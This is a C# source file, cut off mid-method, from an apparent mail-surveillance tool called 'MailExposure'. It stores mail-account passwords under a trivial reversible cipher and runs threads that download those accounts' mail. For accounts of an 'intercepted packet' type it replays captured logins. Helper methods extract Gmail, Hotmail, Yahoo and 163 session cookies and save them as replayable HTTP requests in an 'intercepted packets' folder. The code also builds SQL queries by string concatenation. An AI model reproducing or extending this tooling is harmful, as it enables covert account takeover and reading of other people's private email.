using System;
using System.Collections.Generic;
using System.Collections;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Data.OleDb;
using System.Diagnostics;
using MailExposure.PopMailDB;
using MailExposure.PopMailRC;

namespace MailExposure.POPMailForm
{
    public partial class PopMailControl : UserControl
    {
        static Object pob = null;
        public string EmailDirectory;
        private POPMailReceiver popReceiver;
        public bool checkDateSave;
        private DateTime date;
        private Queue queueUsers;
        public string folderPath;
        private Thread[] threadsRun;
        private bool Auto;
        private OleDbCommand oleDbCommand;
        private bool AllReceiveClick;
        private bool ThreadRunning;
        public PopUserDataSet userDataSet = null;
        private OleDbConnection oleDbConnection = null;
        public OleDbConnection conn;
        private Thread threadParse;
        private OleDbCommand oleDbSelectCommand1;
        public DateTime EmailDateTime;
        public int nThreadCounts;
        public string TimeInterval;
        public string saveFilePath = "";
        public string PageNumber;
        public bool SaveAttachment;
        PopMailDB.PopUserDataSetTableAdapters.usersTableAdapter oleDbDataAdapterView =new PopMailDB.PopUserDataSetTableAdapters.usersTableAdapter();
 
        public int ThreadCounts
        {
            get
            {
                return this.nThreadCounts;
            }
            set
            {
                try
                {
                    for (int i = 0; i < value; i++)
                    {
                        if ((this.threadsRun[i] == null) || (this.threadsRun[i].ThreadState != System.Threading.ThreadState.Suspended))
                        {
                            this.threadsRun[i] = new Thread(new ThreadStart(this.ThreadRunFunction));
                            this.threadsRun[i].Name = i.ToString();
                            this.threadsRun[i].Start();
                        }
                    }
                    this.nThreadCounts = value;
                }
                catch (Exception)
                {
                }
            }
        }


        static PopMailControl()
        {
            pob = new object();
        }

        public PopMailControl()
        {
            InitializeComponent();
            this.EmailDirectory = Directory.GetCurrentDirectory();
            this.popReceiver = new POPMailReceiver();
            this.checkDateSave = true;
            this.date = DateTime.Now;
            this.queueUsers = new Queue();
            this.folderPath = "";
            this.threadsRun = new Thread[10];
            GlobalValue.PopMainForm = this;
            oleDbConnection = new OleDbConnection();
            userDataSet = new PopUserDataSet();
            oleDbConnection.ConnectionString = @"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=|DataDirectory|\Popuser.mdb";

            this.statusBarPanelLoginFailText.Text = "0";
            this.statusBarPanelThreadsText.Text = "0";
            this.statusBarPanelEmailNumbersText.Text = "0";

            if (this.ConnectMdb())
            {
              //  base.Resize += new EventHandler(this.mainFormResize);
            }

        }

        private void BeginReceiveThread(int index)
        {
            int nO = -1;
            string userName = null;
            string passWdtext = null;
            string snote = null;
            string server = null;
            string seraddr = null;
            string stype = null;
            string str7 = null;
            string str8 = null;
            int mailno = -1;
            string str9 = null;
            string validationLogin = null;
            string emailuri = null;
            string str12 = null;
            string passwdType = null;
            string interceptTime = null;
            string sourceAddress = null;
            string objAddress = null;
            string loginInfo = null;
            string usertype = null;
            try
            {
                string str19 = "select * from users where cstr(序号)=" + index.ToString();
                this.oleDbCommand = new OleDbCommand();
                this.oleDbCommand.CommandText = str19;
                this.oleDbCommand.Connection = this.conn;
                OleDbDataReader reader = this.oleDbCommand.ExecuteReader();
                while (reader.Read())
                {
                    nO = Convert.ToInt32(reader[0].ToString());
                    userName = reader[1].ToString();
                    passWdtext = reader[2].ToString();
                    snote = reader[3].ToString();
                    server = reader[4].ToString();
                    seraddr = reader[5].ToString();
                    stype = reader[6].ToString();
                    str7 = reader[7].ToString();
                    str8 = reader[11].ToString();
                    mailno = Convert.ToInt32(reader[12].ToString());
                    reader[13].ToString();
                    reader[14].ToString();
                    reader[15].ToString();
                    reader[0x10].ToString();
                    str9 = reader[0x12].ToString();
                    emailuri = reader[0x13].ToString();
                    validationLogin = reader[20].ToString();
                    str12 = reader[0x15].ToString();
                    passwdType = reader[0x16].ToString();
                    interceptTime = reader[0x17].ToString();
                    sourceAddress = reader[0x18].ToString();
                    objAddress = reader[0x19].ToString();
                    loginInfo = reader[0x1a].ToString();
                    usertype = reader[0x1b].ToString();
                }
                if (passWdtext != "")
                {
                    passWdtext = this.Decryption(passWdtext, userName);
                }
                if (DateTime.Today.ToString() != str8)
                {
                    mailno = 0;
                }
                DateTime now = DateTime.Now;
                if (str9 != "True")
                {
                    if (str12 != "")
                    {
                        DateTime.Compare(Convert.ToDateTime(str12), now);
                    }
                    if (snote.IndexOf("cap") < 0)
                    {
                        validationLogin = null;
                        emailuri = null;
                    }
                    if (str7 == "True")
                    {
                        if (this.Auto)
                        {
                            new BeginReceiveThreads(nO, server, seraddr, userName, passWdtext, snote, stype, mailno, emailuri, validationLogin, usertype).Execute();
                        }
                        else if (this.AllReceiveClick)
                        {
                            if (usertype.IndexOf("数据包") == -1)
                            {
                                new BeginReceiveThreads(nO, server, seraddr, userName, passWdtext, snote, stype, mailno, emailuri, validationLogin, usertype).Execute();
                            }
                            else
                            {
                                new displace(nO.ToString(), userName, passwdType, interceptTime, sourceAddress, objAddress, loginInfo).start();
                            }
                        }
                        else if ((this.ThreadRunning && !this.AllReceiveClick) && !this.Auto)
                        {
                            bool flag = false;
                            for (int i = 0; i < 10; i++)
                            {
                                if (((this.threadsRun[i] == null) || (this.threadsRun[i].ThreadState == System.Threading.ThreadState.Suspended)) || (this.threadsRun[i].ThreadState == System.Threading.ThreadState.Stopped))
                                {
                                    if (usertype.IndexOf("数据包") == -1)
                                    {
                                        BeginReceiveThreads threads3 = new BeginReceiveThreads(nO, server, seraddr, userName, passWdtext, snote, stype, mailno, emailuri, validationLogin, usertype);
                                        this.threadsRun[i] = new Thread(new ThreadStart(threads3.Execute));
                                        this.threadsRun[i].Name = i.ToString();
                                        this.threadsRun[i].Start();
                                        flag = true;
                                    }
                                    else
                                    {
                                        displace displace2 = new displace(nO.ToString(), userName, passwdType, interceptTime, sourceAddress, objAddress, loginInfo);
                                        this.threadsRun[i] = new Thread(new ThreadStart(displace2.start));
                                        this.threadsRun[i].Name = i.ToString();
                                        this.threadsRun[i].Start();
                                        flag = true;
                                    }
                                    break;
                                }
                            }
                            if (!flag)
                            {
                                this.listBoxView.Items.Add("[警告]：请先停止一个线程再接收!");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            }
                        }
                    }
                    else
                    {
                        this.listBoxView.Items.Add(string.Concat(new object[] { "[", server, "：", userName, "]没有控守……  ", now }));
                        this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                    }
                }
                else
                {
                    this.listBoxView.Items.Add(string.Concat(new object[] { "[", server, "：", userName, "]此用户正在接收…………  ", now }));
                    this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                }
            }
            catch (Exception exception)
            {
                this.listBoxView.Items.Add(exception.Message + exception.TargetSite);
            }
        }


        private void ButtonShowAllUsers_Click(object sender, EventArgs e)
        {
            if ((this.threadParse == null) || (this.threadParse.ThreadState != System.Threading.ThreadState.Suspended))
            {
                this.threadParse = new Thread(new ThreadStart(this.StartParse));
                this.threadParse.Start();
            }
            this.buttonChange(true);
            string sqlShowUser = "SELECT * FROM users WHERE 用户类型='普通用户'order by 用户名 asc";
            string sqlCountUsers = "select count(*) from users where 用户类型='普通用户'";
            this.UsersShow(sqlShowUser);
            this.UsersCount(sqlCountUsers);
            for (int i = 0; i < this.dataGridView.Columns.Count; i++)
            {
                this.dataGridView.Columns[i].SortMode = DataGridViewColumnSortMode.Automatic;
            }
            this.dataGridView.Columns[0].Visible = false;

        }

        private void ButtonAddUser_Click(object sender, EventArgs e)
        {
            PopfrmAddUsers users = new PopfrmAddUsers();
            users.Show();
            users.TopMost = true;
        }

        private void buttonChange(bool boo)
        {
            this.ButtonAddUser.Enabled = boo;
            this.ButtonDeleteUser.Enabled = boo;
            this.ButtonEditeUser.Enabled = boo;
            this.ButtonReceiveEmail.Enabled = boo;
            this.ButtonStopReceiveEmail.Enabled = boo;
        }

        private void ButtonDeleteUser_Click(object sender, EventArgs e)
        {
            this.ButtonStopReceiveEmail_Click(sender, e);
            int y = this.dataGridView.CurrentCellAddress.Y;
            if (y > -1)
            {
                string str = this.userDataSet.Tables["users"].Rows[y]["序号"].ToString();
                string strSql = "delete from users where 序号=" + str;
                string str3 = "select 用户名 from users where 序号=" + str;
                string str4 = this.ExecuteSQL(str3);
                if (MessageBox.Show("你确定删除该用户:" + str4, "警告", MessageBoxButtons.YesNo) == DialogResult.Yes)
                {
                    this.ExecuteSQL(strSql);
                    strSql = "delete from MailBoxList where 序号=" + str;
                    this.ExecuteSQL(strSql);
                }
                string sqlCountUsers = "select count(*) from users where 用户类型='普通用户'";
                this.UsersCount(sqlCountUsers);
            }
            else
            {
                MessageBox.Show("请选择用户！");
            }

        }

        private void ButtonEditeUser_Click(object sender, EventArgs e)
        {
            PopfrmAddUsers users = new PopfrmAddUsers();
            users.Text = "编辑用户";
            if (users.EditeUser(this.dataGridView, this.userDataSet))
            {
                users.Show();
                users.TopMost = true;
            }

        }

        private void ButtonExit_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("确定要退出吗？", "警告", MessageBoxButtons.YesNo) == DialogResult.Yes)
            {
                string str = "0";
                string strSql = "update users set 接收状态=" + str;
                GlobalValue.PopMainForm.ExecuteSQL(strSql);
                if (this.conn.State == ConnectionState.Open)
                {
                    this.conn.Close();
                    this.conn.Dispose();
                    this.conn = null;
                }
                if (this.oleDbConnection.State == ConnectionState.Open)
                {
                    this.oleDbConnection.Close();
                    this.oleDbConnection.Dispose();
                }
                this.KillMailProcess();
            }

        }

        public void KillMailProcess()
        {
            foreach (Process process in Process.GetProcesses())
            {
                if (process.Id == Process.GetCurrentProcess().Id)
                {
                    process.Kill();
                }
                process.Dispose();
            }
        }

        private void ButtonReceiveEmail_Click(object sender, EventArgs e)
        {
            try
            {
                int y = this.dataGridView.CurrentCellAddress.Y;
                if (y >= 0)
                {
                    y = Convert.ToInt32(this.dataGridView.Rows[y].Cells["序号"].Value);
                    this.BeginReceiveThread(y);
                }
                else
                {
                    MessageBox.Show("请选择用户!", "警告");
                }
            }
            catch
            {
            }

        }

        public void ButtonStopReceiveEmail_Click(object sender, EventArgs e)
        {
            string strSql = "select count(*) from users where 接收状态=true";
            if (Convert.ToInt32(this.ExecuteSQL(strSql)) > 0)
            {
                if (MessageBox.Show("你确定要停止所有线程?", "警告", MessageBoxButtons.YesNo) == DialogResult.Yes)
                {
                    this.AllReceiveClick = false;
                    for (int i = 0; i < 10; i++)
                    {
                        try
                        {
                            Thread thread = this.threadsRun[i];
                            if ((thread != null) && thread.IsAlive)
                            {
                                if (thread.ThreadState == System.Threading.ThreadState.Suspended)
                                {
                                    thread.Resume();
                                }
                                thread.Abort();
                            }
                        }
                        catch (Exception ex)
                        {
                            string st = ex.Message;
                        }
                    }
                    Thread.Sleep(100);
                    string str2 = "0";
                    strSql = "update users set 接收状态=" + str2;
                    this.ExecuteSQL(strSql);
                }
            }

        }

        private bool ConnectMdb()
        {
            try
            {
                OleDbConnectionStringBuilder builder = new OleDbConnectionStringBuilder();
                builder.DataSource = "./Popuser.mdb";
                builder.Provider = "Microsoft.Jet.OLEDB.4.0";
                this.conn = new OleDbConnection(builder.ConnectionString);
                this.conn.Open();
                return true;
            }
            catch (Exception)
            {
                MessageBox.Show("数据库连接失败！数据库文件不存在！", "警告");
                return false;
            }
        }

        private void dataGridView_DoubleClick(object sender, EventArgs e)
        {
            this.oleDbDataAdapterView.Fill(this.userDataSet.users);
            try
            {
                int y = this.dataGridView.CurrentCellAddress.Y;
                if (y >= 0)
                {
                    y = Convert.ToInt32(this.dataGridView.Rows[y].Cells["序号"].Value);
                    string cmdText = "select * from MailBoxList where 序号=" + y;
                    lock (pob)
                    {
                        this.oleDbSelectCommand1 = new OleDbCommand(cmdText, this.oleDbConnection);
                        OleDbDataReader reader = this.oleDbSelectCommand1.ExecuteReader();
                        string text = "";
                        while (reader.Read())
                        {
                            text = text + reader["MailBoxName"].ToString() + "\r\n";
                        }
                        MessageBox.Show(text);
                        return;
                    }
                }
                MessageBox.Show("请选择用户!", "警告");
            }
            catch
            {
            }

        }

        public string Decryption(string passWdtext, string userName)
        {
            string str = null;
            try
            {
                char[] chArray = passWdtext.ToCharArray();
                int length = userName.Length;
                for (int i = 0; i < chArray.Length; i++)
                {
                    length = length % 0x1a;
                    char ch = chArray[i];
                    if (((ch >= 'a') && (ch <= 'z')) || ((ch >= 'A') && (ch <= 'Z')))
                    {
                        ch = (char)(ch - length);
                        if (((ch < 'A') && (ch >= (0x41 - length))) || ((ch < 'a') && (ch >= (0x61 - length))))
                        {
                            ch = (char)(ch + '\x001a');
                        }
                    }
                    if ((ch >= '0') && (ch <= '9'))
                    {
                        length = length % 10;
                        ch = (char)(ch - length);
                        if ((ch < '0') && (ch >= (0x30 - length)))
                        {
                            ch = (char)(ch + '\n');
                        }
                    }
                    str = str + ch;
                }
            }
            catch (Exception)
            {
                this.listBoxView.Items.Add("解密失败！");
            }
            return str;
        }

        private string DequeueUser()
        {
            string str = "";
            Monitor.Enter(this.queueUsers);
            try
            {
                str = this.queueUsers.Dequeue().ToString();
            }
            catch (Exception)
            {
            }
            Monitor.Exit(this.queueUsers);
            return str;
        }

        public string Encryption(string passWd, string userName)
        {
            string str = null;
            try
            {
                char[] chArray = passWd.ToCharArray();
                int length = userName.Length;
                for (int i = 0; i < chArray.Length; i++)
                {
                    length = length % 0x1a;
                    char ch = chArray[i];
                    if (((ch >= 'a') && (ch <= 'z')) || ((ch >= 'A') && (ch <= 'Z')))
                    {
                        ch = (char)(ch + length);
                        if (((ch > 'Z') && (ch <= (90 + length))) || (ch > 'z'))
                        {
                            ch = (char)(ch - '\x001a');
                        }
                    }
                    if ((ch >= '0') && (ch <= '9'))
                    {
                        length = length % 10;
                        ch = (char)(ch + length);
                        if ((ch > '9') && (ch <= (0x39 + length)))
                        {
                            ch = (char)(ch - '\n');
                        }
                    }
                    str = str + ch;
                }
            }
            catch (Exception)
            {
                this.listBoxView.Items.Add("加密失败！");
            }
            return str;
        }

        private bool EnqueueUser(int rows)
        {
            Monitor.Enter(this.queueUsers);
            try
            {
                int num = Convert.ToInt32(this.dataGridView.Rows[rows].Cells["序号"].Value);
                this.queueUsers.Enqueue(num);
            }
            catch (Exception exception)
            {
                this.listBoxView.Items.Add("写入用户索引失败:" + exception.Message);
            }
            Monitor.Exit(this.queueUsers);
            return true;
        }

        public string ExecuteSQL(string strSql)
        {
            lock (pob)
            {
                this.oleDbSelectCommand1 = new OleDbCommand(strSql, this.oleDbConnection);
                string str = Convert.ToString(this.oleDbSelectCommand1.ExecuteScalar());
                if (((strSql.IndexOf("users") != -1) && (strSql.IndexOf("数据包") == -1)) && (strSql.IndexOf("无密用户") == -1))
                {
                    try
                    {
                        if (strSql.IndexOf("delete") != -1)
                        {
                           // this.userDataSet.Tables["users"].Clear();
                           // dataGridView.DataSource = null;
                         //   this.oleDbDataAdapterView.Fill(this.userDataSet.users);
                           // dataGridView.DataSource = this.userDataSet.users;
                        }
                        else
                        {
                           // dataGridView.DataSource = null;
                           // this.oleDbDataAdapterView.Fill(this.userDataSet.users);
                           // dataGridView.DataSource = this.userDataSet.users;
                        }
                    }
                    catch (Exception exception)
                    {
                        MessageBox.Show(exception.Message + exception.StackTrace);
                    }
                }
                return str;
            }
        }

        public void UpdateUserDataSet()
        {
            this.oleDbDataAdapterView.Fill(this.userDataSet.users);
        }

        public void fileTxx()
        {
            string[] files = Directory.GetFiles(this.folderPath, "*.txx");
            string path = "";
            string strTxx = "";
            StreamReader reader = null;
            int length = files.Length;
            for (int i = 0; i < length; i++)
            {
                path = files[i];
                reader = new StreamReader(path, Encoding.Default);
                strTxx = reader.ReadToEnd();
                reader.Close();
                new Txx().txxMessage(strTxx);
            }
            if (length == 0)
            {
                this.listBoxView.Items.Add("此文件夹没有TXX文件");
                this.listBoxView.SelectedItem = this.listBoxView.Items.Count - 1;
            }
            else
            {
                this.listBoxView.Items.Add("添加完成！");
                this.listBoxView.SelectedItem = this.listBoxView.Items.Count - 1;
            }
        }
        private string get163MailCookieCoremail(string strCookie)
        {
            string str = "";
            string str2 = "";
            strCookie = " " + strCookie + "; ";
            str = this.putstr(strCookie, " Coremail=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "Coremail=" + str + " ";
            }
            return str2;
        }

        private string get163MailCookieNTES_SESS(string strCookie)
        {
            string str = "";
            string str2 = "";
            strCookie = " " + strCookie + "; ";
            str = this.putstr(strCookie, " NTES_SESS=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "NTES_SESS=" + str + " ";
            }
            return str2;
        }

        private string getGmailCookie(string strCookie)
        {
            string str = "";
            string str2 = "";
            strCookie = " " + strCookie + "; ";
            str = this.putstr(strCookie, " SID=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "SID=" + str + " ";
            }
            str = this.putstr(strCookie, " LSID=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "LSID=" + str + " ";
            }
            return str2;
        }

        private string getHCookie(string strCookie)
        {
            string str = "";
            string str2 = "";
            strCookie = " " + strCookie + "; ";
            str = this.putstr(strCookie, " RPSTAuth=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "RPSTAuth=" + str + " ";
            }
            return str2;
        }

        private string getYCookie(string strCookie)
        {
            string str = "";
            string str2 = "";
            strCookie = " " + strCookie + "; ";
            str = this.putstr(strCookie, " B=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "B=" + str + " ";
            }
            str = this.putstr(strCookie, " F=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "F=" + str + " ";
            }
            str = this.putstr(strCookie, " Y=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "Y=" + str + " ";
            }
            str = this.putstr(strCookie, " T=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "T=" + str + " ";
            }
            return str2;
        }

      
        private void mainFormResize(object sender, EventArgs e)
        {
            if (base.Width > 0x3e8)
            {
                this.dataGridView.Font = new Font("宋体", 14.5f, FontStyle.Regular, GraphicsUnit.Point, 0x86);
                this.dataGridView.Location = new Point(0, 0x42);
                this.dataGridView.Size = new Size(0x3fc, 0x166);
                this.dataGridView.RowHeadersWidth = 40;
                if (this.dataGridView.Columns.Count != 0)
                {
                    this.dataGridView.Columns[0].Width = 0x7d;
                    this.dataGridView.Columns[1].Width = 0x68;
                    this.dataGridView.Columns[2].Width = 0x7d;
                    this.dataGridView.Columns[3].Width = 0x68;
                    this.dataGridView.Columns[4].Width = 0x68;
                    this.dataGridView.Columns[5].Width = 0x68;
                    this.dataGridView.Columns[6].Width = 0x68;
                    this.dataGridView.Columns[7].Width = 0x68;
                    this.dataGridView.Columns[8].Width = 0x68;
                }
                this.listBoxView.Font = new Font("宋体", 14.5f, FontStyle.Regular, GraphicsUnit.Point, 0x86);
                this.listBoxView.ItemHeight = 0x13;
                this.listBoxView.Location = new Point(0, 0x1a9);
                this.listBoxView.Size = new Size(0x3fc, 0xfb);
                this.statusBarMessage.Font = new Font("宋体", 14.5f, FontStyle.Regular, GraphicsUnit.Point, 0x86);
                this.statusBarMessage.Size = new Size(0x3fc, 50);
                this.statusBarMessage.Location = new Point(0, 450);
                this.statusBarPanelLoginFailText.Width = 0x68;
                this.statusBarPanelLoginFailText.Width = 0xb6;
            //    this.statusBarPanelRunTime.Width = 0x68;
             //   this.statusBarPanelRunTimeText.Width = 0x76;
                this.statusBarPanelLoginFail.Width = 0x68;
                this.statusBarPanelLoginFailText.Width = 30;
                this.statusBarPanelEmailNumbers.Width = 0x68;
                this.statusBarPanelEmailNumbersText.Width = 0x27;
                this.statusBarPanelUserNumber.Width = 0x47;
                this.statusBarPanelUserNumberText.Width = 0x27;
                this.statusBarPanelThreads.Width = 0x68;
                this.statusBarPanelThreadsText.Width = 130;
            }
            else
            {
                this.dataGridView.Font = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 0x86);
                this.dataGridView.Location = new Point(0, 0x2a);
                this.dataGridView.Size = new Size(0x2c3, 0xce);
                if (this.dataGridView.Columns.Count != 0)
                {
                    this.dataGridView.Columns[0].Width = 90;
                    this.dataGridView.Columns[1].Width = 80;
                    this.dataGridView.Columns[2].Width = 90;
                    this.dataGridView.Columns[3].Width = 80;
                    this.dataGridView.Columns[4].Width = 80;
                    this.dataGridView.Columns[5].Width = 80;
                    this.dataGridView.Columns[6].Width = 80;
                    this.dataGridView.Columns[7].Width = 80;
                    this.dataGridView.Columns[8].Width = 80;
                }
                this.listBoxView.Font = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 0x86);
                this.listBoxView.ItemHeight = 14;
                this.listBoxView.Location = new Point(0, 0xf8);
                this.listBoxView.Size = new Size(0x2c3, 200);
                this.statusBarMessage.Font = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 0x86);
                this.statusBarMessage.Size = new Size(0x313, 30);
                this.statusBarMessage.Location = new Point(0, 0x151);
                //this.statusBarPanelLastLogin.Width = 80;
               // this.statusBarPanelLastLoginText.Width = 130;
               // this.statusBarPanelRunTime.Width = 80;
               // this.statusBarPanelRunTimeText.Width = 80;
                this.statusBarPanelLoginFail.Width = 80;
                this.statusBarPanelLoginFailText.Width = 30;
                this.statusBarPanelEmailNumbers.Width = 80;
                this.statusBarPanelEmailNumbersText.Width = 30;
                this.statusBarPanelUserNumber.Width = 0x37;
                this.statusBarPanelUserNumberText.Width = 30;
                this.statusBarPanelThreads.Width = 80;
                this.statusBarPanelThreadsText.Width = 100;
            }
        }

        private void saveCookieTxx(DateTime dateTime, string cookietxx, string userName, string host)
        {
            if (userName.Length > 0x10)
            {
                userName = "MISS";
            }
            string s = ((((((("XX-Time: " + dateTime.ToString("yyyy-MM-dd HH:mm:ss") + "\r\n") + "XX-ClientIp: 127.0.0.1\r\n" + "XX-ServerIp: 127.0.0.1\r\n") + "XX-User: " + userName + "\r\n") + "\r\n" + "GET / HTTP/1.1\r\n") + "Accept: */*\r\n" + "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)\r\n") + "Cookie: " + cookietxx + "\r\n") + "Host:" + host + "\r\n") + "Connection: Keep-Alive\r\n" + "\r\n";
            FileStream stream = null;
            string path = DateTime.Now.ToString("yyyy-MM-dd");
            string str3 = dateTime.ToString("yyyyMMddHHmmss");
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            path = path + @"\截获数据包";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string str4 = path + @"\" + str3 + ".txx";
            byte[] bytes = Encoding.UTF8.GetBytes(s);
            stream = File.Open(str4, FileMode.Append, FileAccess.Write);
            stream.Write(bytes, 0, bytes.Length);
            stream.Close();
        }

        private void StartParse()
        {
            this.ThreadRunning = true;
        }

        private void ThreadRunFunction()
        {
            while (this.ThreadRunning && (int.Parse(Thread.CurrentThread.Name) < this.ThreadCounts))
            {
                string str = this.DequeueUser();
                if ((str != null) && (str != ""))
                {
                    int index = Convert.ToInt32(str);
                    this.BeginReceiveThread(index);
                }
                else
                {
                    Thread.CurrentThread.Abort();
                }
            }
        }

        private void toolStripButtonAllReceive_Click(object sender, EventArgs e)
        {
            try
            {
                this.queueUsers.Clear();
                this.AllReceiveClick = true;
                int count = this.dataGridView.Rows.Count;
                if (this.toolStripComboBoxThreadsText.Text != "")
                {
                    if (count > 0)
                    {
                        for (int i = 0; i < count; i++)
                        {
                            if (!this.EnqueueUser(i))
                            {
                                this.listBoxView.Items.Add("写入用户索引失败:");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            }
                        }
                        this.ThreadCounts = Convert.ToInt32(this.toolStripComboBoxThreadsText.Text);
                    }
                    else
                    {
                        this.listBoxView.Items.Add("没有可供下载的用户");
                        this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                    }
                }
                else
                {
                    this.listBoxView.Items.Add("请输入线程数");
                }
            }
            catch
            {
            }

        }
        public void UsersCount(string sqlCountUsers)
        {
            string strSql = sqlCountUsers;
            int num = Convert.ToInt32(this.ExecuteSQL(strSql));
            this.statusBarPanelUserNumberText.Text = Convert.ToString(num);
        }
        public void UsersShow(string sqlShowUser)
        {
            this.userDataSet.Clear();
            this.userDataSet.Tables["users"].Columns["服务器"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["口令字"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["端口"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["安全连接"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["开始时间"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["时间段"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["时间间隔"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["时间限制"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["验证登陆"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["邮件地址"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["接收"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["密码类型"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["截取时间"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["源地址"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["目标地址"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["登陆信息"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["用户类型"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["邮箱状态"].ColumnMapping = MappingType.Hidden;
            this.userDataSet.Tables["users"].Columns["全部接收"].ColumnMapping = MappingType.Hidden;
            this.dataGridView.DataSource = this.userDataSet.Tables["users"];
            //this.oleDbSelectCommand1.CommandText = sqlShowUser;
            this.oleDbDataAdapterView.Adapter.SelectCommand.CommandText = sqlShowUser;
            this.oleDbDataAdapterView.Fill(this.userDataSet.users);
         
            for (int i = 0; i < this.dataGridView.Columns.Count; i++)
            {
                this.dataGridView.Columns[i].SortMode = DataGridViewColumnSortMode.NotSortable;
            }
            if (this.dataGridView.Columns.Count > 0)
            {
                if (base.Width > 0x3e8)
                {
                    this.dataGridView.Columns[0].Width = 0x7d;
                    this.dataGridView.Columns[1].Width = 0x68;
                    this.dataGridView.Columns[2].Width = 0x7d;
                    this.dataGridView.Columns[3].Width = 0x68;
                    this.dataGridView.Columns[4].Width = 0x68;
                    this.dataGridView.Columns[5].Width = 0x68;
                    this.dataGridView.Columns[6].Width = 0x68;
                    this.dataGridView.Columns[7].Width = 0x68;
                    this.dataGridView.Columns[7].HeaderText = "自动接收";
                    this.dataGridView.Columns[8].Width = 0x68;
                }
                else
                {
                    this.dataGridView.Columns[0].Width = 90;
                    this.dataGridView.Columns[1].Width = 80;
                    this.dataGridView.Columns[2].Width = 90;
                    this.dataGridView.Columns[3].Width = 80;
                    this.dataGridView.Columns[4].Width = 80;
                    this.dataGridView.Columns[5].Width = 80;
                    this.dataGridView.Columns[6].Width = 80;
                    this.dataGridView.Columns[7].Width = 80;
                    this.dataGridView.Columns[7].HeaderText = "自动接收";
                    this.dataGridView.Columns[8].Width = 80;
                }
            }
        }

        public string putstr(string message, string startStr, string endStr, int startIndex)
        {
            if (startIndex < 0)
            {
                return "-1";
            }
            if (message.Length < startIndex)
            {
                return "-1";
            }
            string str = message.Substring(startIndex, message.Length - startIndex);
            int index = str.IndexOf(startStr);
            if (index < 0)
            {
                return "-1";
            }
            index += startStr.Length;
            str = str.Substring(index, str.Length - index);
            int length = str.IndexOf(endStr);
            if (length < 0)
            {
                return "-1";
            }
            return str.Substring(0, length);
        }

        private void ReadExcel(string strFileName)
        {
            OleDbConnection connection = new OleDbConnection("Provider=Microsoft.Jet.OLEDB.4.0;Data Source =" + strFileName + ";Extended Properties = Excel 8.0");
            try
            {
                string str2 = " SELECT * FROM [20080819204722$] ";
                connection.Open();
                OleDbCommand command = connection.CreateCommand();
                command.CommandText = str2;
                OleDbDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    Convert.ToString(reader[0]);
                    Convert.ToString(reader[1]);
                }
                reader.Close();
            }
            catch (Exception)
            {
                throw new ApplicationException("读取数据源文件时出错");
            }
            finally
            {
                connection.Close();
            }
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == 0x112)
            {
                if (m.WParam.ToInt32() == 0xf020)
                {
                    base.Hide();
                //    this.notifyIconView.Visible = true;
                    return;
                }
                if (m.WParam.ToInt32() == 0xf060)
                {
                    string str = "0";
                    string strSql = "update users set 接收状态=" + str;
                    GlobalValue.PopMainForm.ExecuteSQL(strSql);
                    this.ButtonExit_Click(new object(), new EventArgs());
                    return;
                }
            }
            base.WndProc(ref m);
        }

        private void toolStripComboBoxAutoText_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (this.toolStripComboBoxAutoText.Text == "是")
            {
                this.ButtonReceiveEmail.Enabled = false;
                this.toolStripButtonAllReceive.Enabled = false;
                this.ButtonStopReceiveEmail.Enabled = false;
                this.Auto = true;
                this.timerAutoReceive_Tick(sender, e);
                this.TimeInterval = Setting.GetIniValue("Email", "Receive IntervalTime", "1  小时", AppDomain.CurrentDomain.BaseDirectory + @"\EmailSetting.ini");
                this.TimeInterval = this.TimeInterval.Substring(0, this.TimeInterval.IndexOf(" "));
                if (this.TimeInterval != "")
                {
                    this.timerAutoReceive.Interval = 0x36ee80 * Convert.ToInt32(this.TimeInterval);
                }
                else
                {
